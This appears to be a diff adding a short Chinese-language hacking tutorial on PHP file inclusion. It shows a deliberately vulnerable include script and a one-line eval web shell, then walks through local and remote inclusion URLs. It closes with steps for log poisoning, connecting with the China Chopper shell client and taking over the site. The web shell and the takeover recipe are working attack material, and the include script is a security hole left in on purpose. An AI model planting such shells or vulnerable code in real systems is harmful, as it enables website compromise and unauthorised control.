@@ -1,0 +1,45 @@
+php
+include()、include_once()、require()、require_once()、
+fopen()、readfile()....
+
+JSP/Serlet
+ava.io.file()、java.io.filereader()......
+
+ASP
+include file、include virtual......
+
+本地文件包含
+<?php
+$test=$_GET['c'];
+include($test);
+?>
+保存为include.php
+在同个目录下创建test.txt,内容为
+<?php @eval($_POST['shell']);?>
+访问http://域名/目录/include.php?c=test.txt
+
+远程文件包含（RFI）
+如果php的配置选项allow_url_include为on，
+则include/require函数使可以加载远程文件的。
+<?php
+$test=$_GET['c'];
+include($test);
+?>
+保存为include.php
+http://域名/目录/include.php?c=http://域名/test.txt
+
+本地文件包含技巧
+1.包含用户上传文件
+2.包含data://或php://input等协议
+3.包含Session文件
+4.包含日志文件，比如web server的access log
+
+包含日志：
+通过构造语句让服务器报错并将一句话随报错信息写入日志
+找到日志文件
+用菜刀连接
+拿下网站
+
+
+
+
